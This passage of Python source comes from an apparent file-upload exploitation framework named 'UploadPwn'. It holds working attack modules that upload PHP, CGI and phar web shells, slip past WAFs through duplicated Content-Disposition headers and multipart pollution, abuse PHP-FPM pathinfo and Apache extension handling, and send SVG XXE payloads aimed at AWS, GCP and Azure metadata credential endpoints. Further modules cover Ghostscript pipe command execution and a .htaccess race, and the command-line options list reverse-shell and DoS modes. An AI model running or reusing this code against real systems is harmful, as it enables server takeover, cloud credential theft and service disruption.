
    def attack_cgi_upload(self):
        """Upload CGI scripts (.pl, .cgi, .py) for code execution."""
        info(f"{'─' * 50}")
        info("MODULE: CGI Script Upload")
        info(f"{'─' * 50}")

        cgi_tests = [
            ("shell.pl", CGI_PAYLOADS["perl"], "text/x-perl"),
            ("shell.cgi", CGI_PAYLOADS["bash"], "application/x-cgi"),
            ("shell.py", CGI_PAYLOADS["python"], "text/x-python"),
            ("shell.sh", CGI_PAYLOADS["bash"], "application/x-sh"),
            ("shell.rb", b'#!/usr/bin/ruby\nputs "Content-type: text/html\\n\\n"\nsystem(ENV["QUERY_STRING"])\n', "text/x-ruby"),
        ]

        for fn, content, ct in cgi_tests:
            s, b, resp = self.upload(fn, content, ct)
            if self.is_success(s, b):
                ok(f"CGI script uploaded: {fn}")
                server_name = self._process_upload_response(fn, b, resp)
                # Check cgi-bin and upload dirs
                cgi_dirs = ["/cgi-bin/", "/cgi/"] + self.shell_dirs[:5]
                for d in cgi_dirs:
                    for check_fn in [fn, server_name] if server_name else [fn]:
                        url = f"{self.sm.target}{d}{check_fn}"
                        try:
                            r = self.sm.session.get(f"{url}?id", timeout=8)
                            if r.status_code == 200 and re.search(r'uid=\d+', r.text):
                                pwn(f"CGI RCE at {url}")
                                self.rce_found = True
                                if self.d:
                                    self.d.record_rce(fn, url, "QUERY_STRING", "CGI script execution")
                                return fn, url
                        except:
                            pass

        info("CGI scripts — no execution detected")
        return None, None

    # ── MODULE: Double Content-Disposition ─────────────────────────────────────

    def attack_double_content_disposition(self):
        """
        Send two Content-Disposition headers or two filename params.
        Some servers/WAFs use the first, others use the last — if they disagree, bypass.
        """
        info(f"{'─' * 50}")
        info("MODULE: Double Content-Disposition Bypass")
        info(f"{'─' * 50}")

        shell = b"GIF89a;\n<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        boundary = "----UploadPwnBoundary" + str(random.randint(100000, 999999))

        # Technique 1: Two filename params (first innocent, second malicious)
        tricks = [
            # WAF sees .jpg, server sees .php
            (f'form-data; name="{self.field}"; filename="safe.jpg"; filename="shell.php"', "double_filename"),
            # Reversed
            (f'form-data; name="{self.field}"; filename="shell.php"; filename="safe.jpg"', "double_filename_rev"),
            # filename vs filename*
            (f'form-data; name="{self.field}"; filename="safe.jpg"; filename*=UTF-8\'\'shell.php', "filename_star"),
            # Mixed quotes
            (f'form-data; name="{self.field}"; filename=safe.jpg; filename="shell.php"', "unquoted_first"),
            # Tab-separated duplicate
            (f'form-data; name="{self.field}"; filename="safe.jpg";\tfilename="shell.php"', "tab_sep"),
            # Newline in header (CRLF injection in Content-Disposition)
            (f'form-data; name="{self.field}"; filename="shell.php%0a.jpg"', "crlf_filename"),
        ]

        for cd_header, trick_name in tricks:
            body = (
                f"--{boundary}\r\n"
                f"Content-Disposition: {cd_header}\r\n"
                f"Content-Type: image/gif\r\n\r\n"
            ).encode() + shell + f"\r\n--{boundary}--\r\n".encode()

            try:
                r = self.sm.session.post(
                    self.upload_url,
                    data=body,
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                    timeout=self.sm.timeout,
                )
                if self.is_success(r.status_code, r.text):
                    ok(f"Double CD accepted ({trick_name})")
                    # Check for RCE
                    for fn_check in ["shell.php", "safe.jpg"]:
                        for d in self.shell_dirs[:8]:
                            url = f"{self.sm.target}{d}{fn_check}"
                            try:
                                r2 = self.sm.session.get(f"{url}?{self.cmd_param}=id", timeout=8)
                                if r2.status_code == 200 and re.search(r'uid=\d+', r2.text):
                                    pwn(f"Double CD RCE at {url} (via {trick_name})")
                                    self.rce_found = True
                                    if self.d:
                                        self.d.record_rce(fn_check, url, self.cmd_param,
                                                          f"double Content-Disposition: {trick_name}")
                                    return fn_check, url
                            except:
                                pass
            except:
                pass

        info("Double Content-Disposition — no bypass found")
        return None, None

    # ── MODULE: Phar Deserialization ──────────────────────────────────────────

    def attack_phar_deser(self):
        """
        Upload a .phar file. If the app uses phar://, file_exists(), is_dir(), etc.
        on user-controlled paths, this can trigger deserialization → RCE.
        Also tests if .phar executes as PHP directly.
        """
        info(f"{'─' * 50}")
        info("MODULE: Phar Upload / Deserialization")
        info(f"{'─' * 50}")

        shell = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        magic_shell = b"GIF89a;\n" + shell

        # Test 1: Direct .phar execution (some servers execute .phar as PHP)
        for content, ct in [(shell, "application/x-php"), (magic_shell, "image/gif")]:
            fn = "shell.phar"
            s, b, resp = self.upload(fn, content, ct)
            if self.is_success(s, b):
                ok(f".phar uploaded with {ct}")
                server_name = self._process_upload_response(fn, b, resp)
                rce_ok, url, param, out = self.verify_rce(fn, server_name)
                if rce_ok:
                    self.launch_shell(fn, url, param, out, "phar_direct", ct)
                    return fn, url

        # Test 2: .phar with image extension (bypass whitelist)
        for ext in [".phar.jpg", ".phar.png", ".phar.gif", ".jpg.phar"]:
            fn = f"shell{ext}"
            s, b, resp = self.upload(fn, magic_shell, "image/gif")
            if self.is_success(s, b):
                ok(f"Phar with image ext uploaded: {fn}")
                server_name = self._process_upload_response(fn, b, resp)
                rce_ok, url, param, out = self.verify_rce(fn, server_name)
                if rce_ok:
                    self.launch_shell(fn, url, param, out, "phar_imgext", "image/gif")
                    return fn, url

        info("Phar upload — no direct execution. Check if app uses phar:// wrapper.")
        return None, None

    # ── MODULE: PHP-FPM Path Info Exploit ────────────────────────────────────

    def attack_phpfpm_pathinfo(self):
        """
        Exploit cgi.fix_pathinfo=1 (default) on Nginx+PHP-FPM.
        Upload image with PHP code, then request image.jpg/x.php.
        PHP-FPM walks up the path and executes the image as PHP.
        """
        info(f"{'─' * 50}")
        info("MODULE: PHP-FPM Path Info (cgi.fix_pathinfo exploit)")
        info(f"{'─' * 50}")

        marker = f"PATHINFO_{random.randint(100000,999999)}"
        payloads = [
            ("pathinfo.jpg", b"GIF89a;\n<?php echo '" + marker.encode() + b"'; ?>", "image/jpeg"),
            ("pathinfo.png", b"\x89PNG\r\n\x1a\n<?php echo '" + marker.encode() + b"'; ?>", "image/png"),
            ("pathinfo.gif", b"GIF89a;\n<?php echo '" + marker.encode() + b"'; ?>", "image/gif"),
        ]

        for fn, content, ct in payloads:
            s, b, resp = self.upload(fn, content, ct)
            if self.is_success(s, b):
                server_name = self._process_upload_response(fn, b, resp) if hasattr(self, '_process_upload_response') else None
                check_names = [fn]
                if server_name:
                    check_names.insert(0, server_name)

                for d in self.shell_dirs[:10]:
                    for cn in check_names:
                        # The key trick: append /x.php to the image URL
                        for suffix in ["/x.php", "/.php", "/a.php", "/nonexistent.php"]:
                            url = f"{self.sm.target}{d}{cn}{suffix}"
                            try:
                                r = self.sm.session.get(url, timeout=8)
                                if r.status_code == 200 and marker in r.text:
                                    pwn(f"PHP-FPM pathinfo exploit works! {url}")
                                    # Upload real shell
                                    shell_fn = f"pinfo_{fn}"
                                    shell_content = fn.encode()[:4] + b"\n<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
                                    if "gif" in fn:
                                        shell_content = b"GIF89a;\n<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
                                    self.upload(shell_fn, shell_content, ct)
                                    shell_url = f"{self.sm.target}{d}{shell_fn}{suffix}"
                                    test_url = f"{shell_url}?{self.cmd_param}=id"
                                    try:
                                        r2 = self.sm.session.get(test_url, timeout=8)
                                        if r2.status_code == 200 and re.search(r'uid=\d+', r2.text):
                                            self.rce_found = True
                                            if self.d:
                                                self.d.record_rce(shell_fn, shell_url, self.cmd_param,
                                                                  "PHP-FPM pathinfo cgi.fix_pathinfo=1")
                                            return shell_fn, shell_url
                                    except:
                                        pass
                            except:
                                pass

        info("PHP-FPM pathinfo — not vulnerable or cgi.fix_pathinfo=0")
        return None, None

    # ── MODULE: Multipart Parameter Pollution ────────────────────────────────

    def attack_multipart_pollution(self):
        """
        Send two file parts with same field name. WAF checks the first (safe),
        backend processes the last (malicious). Or vice versa depending on stack.
        """
        info(f"{'─' * 50}")
        info("MODULE: Multipart Parameter Pollution")
        info(f"{'─' * 50}")

        shell = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        safe_img = b"GIF89a;SAFE"
        boundary = f"----WebKitFormBoundary{random.randint(100000,999999)}"

        tricks = [
            # Safe first, malicious second (backend uses last)
            ("safe_first", [
                (self.field, "safe.jpg", "image/jpeg", safe_img),
                (self.field, "shell.php", "application/x-php", shell),
            ]),
            # Malicious first, safe second (backend uses first)
            ("malicious_first", [
                (self.field, "shell.php", "application/x-php", shell),
                (self.field, "safe.jpg", "image/jpeg", safe_img),
            ]),
            # Same name but different field variations
            ("field_variant", [
                (self.field, "safe.jpg", "image/jpeg", safe_img),
                (self.field + "[]", "shell.php", "image/jpeg", shell),
            ]),
        ]

        for trick_name, parts in tricks:
            body = b""
            for field_name, filename, ct, content in parts:
                body += f"--{boundary}\r\n".encode()
                body += f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode()
                body += f"Content-Type: {ct}\r\n\r\n".encode()
                body += content + b"\r\n"
            body += f"--{boundary}--\r\n".encode()

            try:
                ep = self.sm.upload_endpoint or self.sm.target + "/"
                r = self.sm.session.post(
                    ep,
                    data=body,
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                    timeout=self.sm.timeout,
                )
                if self.is_success(r.status_code, r.text):
                    ok(f"Multipart pollution accepted ({trick_name})")
                    for fn_check in ["shell.php"]:
                        for d in self.shell_dirs[:8]:
                            url = f"{self.sm.target}{d}{fn_check}"
                            try:
                                r2 = self.sm.session.get(f"{url}?{self.cmd_param}=id", timeout=8)
                                if r2.status_code == 200 and re.search(r'uid=\d+', r2.text):
                                    pwn(f"Multipart pollution RCE at {url} ({trick_name})")
                                    self.rce_found = True
                                    if self.d:
                                        self.d.record_rce(fn_check, url, self.cmd_param,
                                                          f"multipart pollution: {trick_name}")
                                    return fn_check, url
                            except:
                                pass
            except:
                pass

        info("Multipart parameter pollution — no bypass found")
        return None, None

    # ── MODULE: Content-Transfer-Encoding Base64 Smuggling ───────────────────

    def attack_cte_base64(self):
        """
        Encode file content as base64 in multipart body with
        Content-Transfer-Encoding: base64. Some backends decode this, WAFs don't.
        """
        info(f"{'─' * 50}")
        info("MODULE: Content-Transfer-Encoding Base64 Smuggling")
        info(f"{'─' * 50}")

        shell = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        b64_shell = base64.b64encode(shell).decode()
        boundary = f"----WebKitFormBoundary{random.randint(100000,999999)}"

        filenames = ["shell.php", "shell.phtml", "shell.pht", "shell.php5"]
        for fn in filenames:
            body = f"--{boundary}\r\n"
            body += f'Content-Disposition: form-data; name="{self.field}"; filename="{fn}"\r\n'
            body += f"Content-Type: image/jpeg\r\n"
            body += f"Content-Transfer-Encoding: base64\r\n\r\n"
            body += f"{b64_shell}\r\n"
            body += f"--{boundary}--\r\n"

            try:
                ep = self.sm.upload_endpoint or self.sm.target + "/"
                r = self.sm.session.post(
                    ep,
                    data=body.encode(),
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                    timeout=self.sm.timeout,
                )
                if self.is_success(r.status_code, r.text):
                    ok(f"CTE base64 accepted: {fn}")
                    server_name = self._process_upload_response(fn, r.text, r) if hasattr(self, '_process_upload_response') else None
                    rce_ok, url, param, out = self.verify_rce(fn, server_name)
                    if rce_ok:
                        self.launch_shell(fn, url, param, out, "cte_base64", "image/jpeg")
                        return fn, url
            except:
                pass

        info("CTE base64 smuggling — no bypass found")
        return None, None

    # ── MODULE: Path Truncation (NTFS 255+ char) ────────────────────────────

    def attack_path_truncation(self):
        """
        On Windows/NTFS, filenames > 255 chars get truncated.
        Upload shell.php + 240 A's + .jpg → truncated to shell.php.
        """
        info(f"{'─' * 50}")
        info("MODULE: Path Truncation (NTFS 255-char limit)")
        info(f"{'─' * 50}")

        shell = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        padding_chars = ["A", ".", "/.", "./"]

        for pad in padding_chars:
            # Calculate padding to make total > 255
            base = "shell.php"
            needed = 256 - len(base) - 4  # -4 for .jpg
            fn = base + pad * (needed // len(pad)) + ".jpg"
            if len(fn) < 256:
                fn = base + pad * ((260 - len(base) - 4) // len(pad)) + ".jpg"

            s, b, resp = self.upload(fn, shell, "image/jpeg")
            if self.is_success(s, b):
                ok(f"Truncation payload accepted (pad={repr(pad)}, len={len(fn)})")
                # Check if truncated version exists
                for d in self.shell_dirs[:8]:
                    url = f"{self.sm.target}{d}shell.php"
                    try:
                        r = self.sm.session.get(f"{url}?{self.cmd_param}=id", timeout=8)
                        if r.status_code == 200 and re.search(r'uid=\d+', r.text):
                            pwn(f"Path truncation RCE at {url}")
                            self.rce_found = True
                            if self.d:
                                self.d.record_rce("shell.php", url, self.cmd_param,
                                                  f"NTFS path truncation (pad={repr(pad)})")
                            return "shell.php", url
                    except:
                        pass

        info("Path truncation — not vulnerable (likely not Windows/NTFS)")
        return None, None

    # ── MODULE: Apache Unrecognized Extension ────────────────────────────────

    def attack_apache_unrecognized_ext(self):
        """
        Apache mod_mime processes shell.php.foobar as PHP if .foobar is not
        a recognized extension. It falls back to the next-to-last extension.
        """
        info(f"{'─' * 50}")
        info("MODULE: Apache Unrecognized Extension Bypass")
        info(f"{'─' * 50}")

        marker = f"APEXT_{random.randint(100000,999999)}"
        test_content = f"<?php echo '{marker}'; ?>".encode()
        shell = b"<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"

        # Random/nonsense extensions that Apache won't recognize
        unknown_exts = [".foobar", ".xyz123", ".blah", ".aaa", ".zzz",
                        ".abc", ".test", ".upload", ".bak123", ".orig"]

        for unk_ext in unknown_exts:
            for php_ext in [".php", ".phtml", ".pht"]:
                fn = f"shell{php_ext}{unk_ext}"
                s, b, resp = self.upload(fn, test_content, "image/jpeg")
                if self.is_success(s, b):
                    server_name = self._process_upload_response(fn, b, resp) if hasattr(self, '_process_upload_response') else None
                    check_names = [fn]
                    if server_name:
                        check_names.insert(0, server_name)
                    for d in self.shell_dirs[:8]:
                        for cn in check_names:
                            url = f"{self.sm.target}{d}{cn}"
                            try:
                                r = self.sm.session.get(url, timeout=8)
                                if r.status_code == 200 and marker in r.text:
                                    ok(f"Apache unrecognized ext works: {fn}")
                                    # Upload real shell
                                    shell_fn = f"pwn{php_ext}{unk_ext}"
                                    self.upload(shell_fn, shell, "image/jpeg")
                                    shell_url = f"{self.sm.target}{d}{shell_fn}"
                                    rce_ok, rurl, param, out = self.verify_rce(shell_fn, None)
                                    if rce_ok:
                                        self.launch_shell(shell_fn, rurl, param, out,
                                                          "apache_unrecognized_ext", "image/jpeg")
                                        return shell_fn, rurl
                            except:
                                pass

        info("Apache unrecognized extension — not vulnerable")
        return None, None

    # ── MODULE: SSRF via Upload (Cloud Metadata) ─────────────────────────────

    def attack_ssrf_metadata(self):
        """
        Upload SVG/PDF/HTML with SSRF payloads targeting cloud metadata endpoints.
        Works when server-side processes (image resize, PDF gen) fetch external resources.
        """
        info(f"{'─' * 50}")
        info("MODULE: SSRF via Upload → Cloud Metadata")
        info(f"{'─' * 50}")

        metadata_urls = [
            ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
            ("AWS Creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("GCP Token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            ("Azure Token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"),
            ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
        ]

        results = []
        for cloud_name, meta_url in metadata_urls:
            # SVG with external entity
            svg_ssrf = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "{meta_url}"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>'''.encode()

            fn = f"ssrf_{cloud_name.replace(' ','_').lower()}.svg"
            s, b, resp = self.upload(fn, svg_ssrf, "image/svg+xml")
            if self.is_success(s, b):
                # Check if response or display page contains metadata
                content_to_check = b or ""
                if resp and hasattr(resp, 'text'):
                    content_to_check = resp.text

                # Look for cloud metadata indicators
                cloud_indicators = ["iam", "security-credentials", "access_token",
                                    "ami-id", "instance-id", "project-id",
                                    "oauth2", "droplet_id"]
                for indicator in cloud_indicators:
                    if indicator in content_to_check.lower() if isinstance(content_to_check, str) else indicator.encode() in content_to_check:
                        pwn(f"SSRF → {cloud_name} metadata exposed!")
                        print(f"\n{G}--- {cloud_name} ---{W}\n{content_to_check[:2000]}")
                        if self.d:
                            self.d.record_vuln("SSRF", f"Cloud metadata via SVG: {cloud_name}", "CRITICAL")
                        results.append((cloud_name, content_to_check[:500]))
                        break

                # Also check display pages for SVG content
                for d in self.shell_dirs[:5]:
                    try:
                        r = self.sm.session.get(f"{self.sm.target}{d}{fn}", timeout=8)
                        if r.status_code == 200:
                            for indicator in cloud_indicators:
                                if indicator in r.text.lower():
                                    pwn(f"SSRF → {cloud_name} metadata at {d}{fn}!")
                                    print(f"\n{G}--- {cloud_name} ---{W}\n{r.text[:2000]}")
                                    if self.d:
                                        self.d.record_vuln("SSRF",
                                            f"Cloud metadata via SVG display: {cloud_name}", "CRITICAL")
                                    results.append((cloud_name, r.text[:500]))
                                    break
                    except:
                        pass

        if results:
            ok(f"SSRF found {len(results)} cloud metadata exposures!")
            return results
        info("SSRF metadata — no cloud metadata exposed")
        return None

    # ── MODULE: Ghostscript Exploit ──────────────────────────────────────────

    def attack_ghostscript(self):
        """
        Upload EPS/PS files that exploit Ghostscript command execution.
        CVE-2023-36664 and similar — works when server processes PDF/images with GS.
        """
        info(f"{'─' * 50}")
        info("MODULE: Ghostscript RCE (CVE-2023-36664 + variants)")
        info(f"{'─' * 50}")

        marker = f"GS_{random.randint(100000,999999)}"

        gs_payloads = [
            # CVE-2023-36664 style (pipe injection in filename handling)
            ("gs_pipe.eps", f"""%!PS
userdict /setpagedevice undef
save
/product where {{pop product (Ghostscript) search {{pop pop pop}} if}} if
matrix currentmatrix
currentpagedevice /PageSize get aload pop
{{exch 2 copy gt {{exch}} if pop}} stopped not {{pop pop}} if
clip
newpath
(%pipe%echo {marker}) (r) file
200 string readstring pop
show
showpage
restore
""".encode()),
            # Classic /OutputFile pipe
            ("gs_output.eps", f"""%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
(%pipe%id) (w) file dup ({marker}) writestring closefile
showpage
""".encode()),
            # PostScript pipe via filenameforall
            ("gs_fnfa.ps", f"""%!PS
({marker}) print
(%pipe%id) print
quit
""".encode()),
        ]

        for fn, content in gs_payloads:
            for ct in ["application/postscript", "image/x-eps", "application/pdf", "application/octet-stream"]:
                s, b, resp = self.upload(fn, content, ct)
                if self.is_success(s, b):
                    ok(f"Ghostscript payload uploaded: {fn} ({ct})")
                    content_to_check = b or ""
                    if isinstance(content_to_check, str) and (marker in content_to_check or "uid=" in content_to_check):
                        pwn(f"Ghostscript RCE confirmed! Marker found in response")
                        if self.d:
                            self.d.record_vuln("Ghostscript RCE", f"Command execution via {fn}", "CRITICAL")
                        return fn, content_to_check

                    # Check display pages
                    for d in self.shell_dirs[:5]:
                        try:
                            r = self.sm.session.get(f"{self.sm.target}{d}{fn}", timeout=8)
                            if r.status_code == 200 and (marker in r.text or "uid=" in r.text):
                                pwn(f"Ghostscript RCE at {d}{fn}!")
                                if self.d:
                                    self.d.record_vuln("Ghostscript RCE",
                                        f"Command execution via {fn}", "CRITICAL")
                                return fn, r.text[:500]
                        except:
                            pass

        info("Ghostscript — no execution detected")
        return None, None

    # ── MODULE: TOCTOU Parallel .htaccess Race ───────────────────────────────

    def attack_htaccess_race(self):
        """
        Upload .htaccess and shell.jpg simultaneously. If .htaccess lands first
        in the race window, shell.jpg executes as PHP.
        """
        info(f"{'─' * 50}")
        info("MODULE: Parallel .htaccess + Shell Race Condition")
        info(f"{'─' * 50}")

        htaccess = b"AddType application/x-httpd-php .jpg .gif .png"
        shell = b"GIF89a;\n<?php system($_GET['" + self.cmd_param.encode() + b"']); ?>"
        shell_fn = "racewin.jpg"
        rounds = 20

        ok(f"Sending {rounds} parallel .htaccess + shell pairs...")

        for _ in range(rounds):
            threads = []
            results = [None, None]

            def upload_htaccess():
                try:
                    results[0] = self.upload(".htaccess", htaccess, "text/plain")
                except:
                    pass

            def upload_shell():
                try:
                    results[1] = self.upload(shell_fn, shell, "image/gif")
                except:
                    pass

            t1 = threading.Thread(target=upload_htaccess)
            t2 = threading.Thread(target=upload_shell)
            t1.start()
            t2.start()
            t1.join(timeout=10)
            t2.join(timeout=10)

            # Immediately check if shell executes
            for d in self.shell_dirs[:5]:
                url = f"{self.sm.target}{d}{shell_fn}"
                try:
                    r = self.sm.session.get(f"{url}?{self.cmd_param}=id", timeout=5)
                    if r.status_code == 200 and re.search(r'uid=\d+', r.text):
                        pwn(f"htaccess race condition RCE at {url}")
                        self.rce_found = True
                        if self.d:
                            self.d.record_rce(shell_fn, url, self.cmd_param,
                                              "TOCTOU .htaccess + shell race")
                        return shell_fn, url
                except:
                    pass

        info("htaccess race — no race window exploited")
        return None, None

    # ── MODULE: Form Discovery ───────────────────────────────────────────────

    def discover_all(self, page_url=None):
        info(f"{'─' * 50}")
        info("MODULE: Form & Directory Discovery")
        info(f"{'─' * 50}")

        if BS4_OK:
            url = page_url or self.sm.target
            try:
                r = self.sm.session.get(url, timeout=self.sm.timeout)
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    for fi in form.find_all("input", {"type": "file"}):
                        fname = fi.get("name", "?")
                        action = form.get("action", "?")
                        ok(f"Upload field: '{fname}' → {urljoin(url, action)}")
                        if self.d:
                            self.d.log("discovery", "found",
                                       f"Field: {fname}, action: {action}")
                # Find links to potential upload pages
                for a in soup.find_all("a", href=True):
                    href = a["href"].lower()
                    if any(kw in href for kw in ["upload", "file", "avatar",
                                                  "import", "attach", "media"]):
                        ok(f"Potential upload page: {urljoin(url, a['href'])}")
            except Exception as e:
                fail(f"Discovery error: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    global VERBOSITY
    print(BANNER)

    # Suppress InsecureRequestWarning
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    ap = argparse.ArgumentParser(
        prog="uploadpwn",
        description=f"UploadPwn v{__version__} — Universal File Upload Exploitation Framework",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""{C}
═══ EXAMPLES ═══════════════════════════════════════════════════════════════

  # Auto-detect everything, run full scan
  uploadpwn -t http://TARGET:PORT --all

  # Specific upload endpoint + field
  uploadpwn -t http://TARGET -e /upload.php --field fileToUpload

  # With login
  uploadpwn -t http://TARGET --login /login.php --user admin --pass admin

  # Login → navigate → upload page
  uploadpwn -t http://TARGET --login /login.php --user admin --pass admin \\
    --nav /dashboard --upload-page /profile/settings --field avatar

  # Cookie-based auth (already have session)
  uploadpwn -t http://TARGET --cookie "PHPSESSID=abc123" --all

  # SVG XXE — read flag
  uploadpwn -t http://TARGET --svg-read /flag.txt

  # Full scan targeting IIS specifically
  uploadpwn -t http://TARGET --all --server-type asp

  # WAR deployment against Tomcat
  uploadpwn -t http://TARGET --war

  # LFI chaining (upload dir not web-accessible)
  uploadpwn -t http://TARGET --lfi

  # Everything + interactive shell
  uploadpwn -t http://TARGET --all --interactive -v

  # With proxy (Burp Suite)
  uploadpwn -t http://TARGET --all --proxy http://127.0.0.1:8080
═══════════════════════════════════════════════════════════════════════════{W}
        """
    )

    # ── Target ────────────────────────────────────────────────────────────────
    target_group = ap.add_argument_group(f"{B}Target{W}")
    target_group.add_argument("-t", "--target", required=True,
                              help="Target base URL  e.g. http://10.10.10.10:8080")
    target_group.add_argument("-e", "--endpoint", default=None,
                              help="Upload endpoint path  e.g. /upload.php  (auto-detected)")
    target_group.add_argument("--field", default=None,
                              help="Upload field name  (auto-detected)")
    target_group.add_argument("--cmd-param", default="cmd",
                              help="Shell command parameter (default: cmd)")
    target_group.add_argument("--flag", default="/flag.txt",
                              help="Flag file to read after RCE")
    target_group.add_argument("--server-type", default="all",
                              choices=["all", "php", "asp", "jsp", "cf"],
                              help="Target server type (limits payloads)")
    target_group.add_argument("--shell-dirs", nargs="+", default=None,
                              help="Custom directories to search for shell")

    # ── Auth ──────────────────────────────────────────────────────────────────
    auth_group = ap.add_argument_group(f"{B}Authentication{W}")
    auth_group.add_argument("--login", help="Login page path  e.g. /login.php")
    auth_group.add_argument("--user", help="Username")
    auth_group.add_argument("--pass", dest="password", help="Password")
    auth_group.add_argument("--user-field", default="username",
                            help="Username form field")
    auth_group.add_argument("--pass-field", default="password",
                            help="Password form field")
    auth_group.add_argument("--login-method", default="auto",
                            choices=["auto", "requests", "selenium"])
    auth_group.add_argument("--nav", dest="nav_url",
                            help="Page to navigate to after login")
    auth_group.add_argument("--upload-page", dest="upload_page",
                            help="Page where upload form lives")
    auth_group.add_argument("--cookie", action="append", dest="cookies",
                            metavar="NAME=VALUE", help="Inject cookie (repeatable)")
    auth_group.add_argument("--header", action="append", dest="headers",
                            metavar="Name: Value", help="Inject header (repeatable)")

    # ── Modules ───────────────────────────────────────────────────────────────
    mod_group = ap.add_argument_group(f"{B}Attack Modules{W}")
    mod_group.add_argument("--all", action="store_true",
                           help="Run ALL modules")
    mod_group.add_argument("--smart", action="store_true",
                           help="Smart mode — probe filters then auto-pick best attacks")
    mod_group.add_argument("--ext-fuzz", action="store_true",
                           help="Fuzz extensions with PHP hello-world + check execution")
    mod_group.add_argument("--matrix", action="store_true",
                           help="Extension bypass matrix (default)")
    mod_group.add_argument("--htaccess", action="store_true",
                           help=".htaccess upload attack")
    mod_group.add_argument("--webconfig", action="store_true",
                           help="web.config upload (IIS)")
    mod_group.add_argument("--svg-read", metavar="PATH",
                           help="SVG XXE file read")
    mod_group.add_argument("--svg-src", metavar="FILE",
                           help="SVG XXE PHP source read")
    mod_group.add_argument("--svg-xss", action="store_true",
                           help="SVG XSS upload")
    mod_group.add_argument("--svg-ssrf", metavar="URL",
                           help="SVG SSRF")
    mod_group.add_argument("--race", action="store_true",
                           help="Race condition attack")
    mod_group.add_argument("--zip", action="store_true",
                           help="Zip slip path traversal")
    mod_group.add_argument("--symlink-zip", metavar="FILE",
                           help="Symlink zip file read (e.g. /etc/passwd)")
    mod_group.add_argument("--war", action="store_true",
                           help="WAR file deployment (Tomcat/JBoss)")
    mod_group.add_argument("--imagetragick", action="store_true",
                           help="ImageTragick CVE-2016-3714")
    mod_group.add_argument("--imagetragick-read", metavar="FILE",
                           help="ImageTragick file read via label")
    mod_group.add_argument("--imagetragick-revshell", metavar="IP:PORT",
                           help="ImageTragick reverse shell")
    mod_group.add_argument("--polyglot", action="store_true",
                           help="PNG/JPEG/GIF polyglot attacks")
    mod_group.add_argument("--raw-null", action="store_true",
                           help="Raw null byte in multipart header")
    mod_group.add_argument("--chunked", action="store_true",
                           help="Chunked transfer encoding bypass")
    mod_group.add_argument("--lfi", action="store_true",
                           help="LFI chaining for non-accessible uploads")
    mod_group.add_argument("--error-disclose", action="store_true",
                           help="Error-based path disclosure")
    mod_group.add_argument("--iis-semicolon", action="store_true",
                           help="IIS semicolon trick (shell.aspx;.jpg)")
    mod_group.add_argument("--char-inject", action="store_true",
                           help="Character injection bypass (null bytes, newlines, etc.)")
    mod_group.add_argument("--boundary", action="store_true",
                           help="Multipart boundary manipulation")
    mod_group.add_argument("--dos", action="store_true",
                           help="DoS surface probes")
    mod_group.add_argument("--discover", action="store_true",
                           help="Discover forms and directories")
    mod_group.add_argument("--dir-enum", action="store_true",
                           help="Directory enumeration")
    mod_group.add_argument("--wordlist", metavar="FILE",
                           help="Wordlist for directory enumeration")
    mod_group.add_argument("--no-probe", action="store_true",
                           help="Skip filter fingerprinting")
    mod_group.add_argument("--filename-inject", action="store_true",
                           help="Test command/XSS/SQLi injection in filenames")
    mod_group.add_argument("--exif-xss", action="store_true",
                           help="Upload JPEG with XSS in EXIF metadata")
    mod_group.add_argument("--docx-xxe", metavar="PATH",
                           help="DOCX XXE file read")
    mod_group.add_argument("--xlsx-xxe", metavar="PATH",
                           help="XLSX XXE file read")
    mod_group.add_argument("--bomb", action="store_true",
                           help="Decompression bomb upload")
    mod_group.add_argument("--pixel-flood", action="store_true",
                           help="Pixel flood DoS test")
    mod_group.add_argument("--win83", action="store_true",
                           help="Windows 8.3 short filename attacks")
    mod_group.add_argument("--userini", action="store_true",
                           help=".user.ini auto_prepend_file attack (Nginx/CGI)")
    mod_group.add_argument("--ssi", action="store_true",
                           help="Server Side Includes injection (.shtml)")
    mod_group.add_argument("--path-traversal", action="store_true",
                           help="Path traversal via filename (../ sequences)")
    mod_group.add_argument("--unicode", action="store_true",
                           help="Unicode normalization bypass attacks")
    mod_group.add_argument("--put-upload", action="store_true",
                           help="HTTP PUT method upload bypass")
    mod_group.add_argument("--stored-xss", action="store_true",
                           help="Stored XSS via PDF/HTML/SVG upload")
    mod_group.add_argument("--cgi", action="store_true",
                           help="CGI script upload (.pl, .cgi, .py, .sh)")
    mod_group.add_argument("--double-cd", action="store_true",
                           help="Double Content-Disposition header attack")
    mod_group.add_argument("--phar-deser", action="store_true",
                           help="Phar deserialization / direct execution")
    mod_group.add_argument("--phpfpm-pathinfo", action="store_true",
                           help="PHP-FPM cgi.fix_pathinfo=1 exploit")
    mod_group.add_argument("--multipart-pollute", action="store_true",
                           help="Multipart parameter pollution attack")
    mod_group.add_argument("--cte-base64", action="store_true",
                           help="Content-Transfer-Encoding base64 smuggling")
    mod_group.add_argument("--path-truncation", action="store_true",
                           help="NTFS 255-char path truncation")
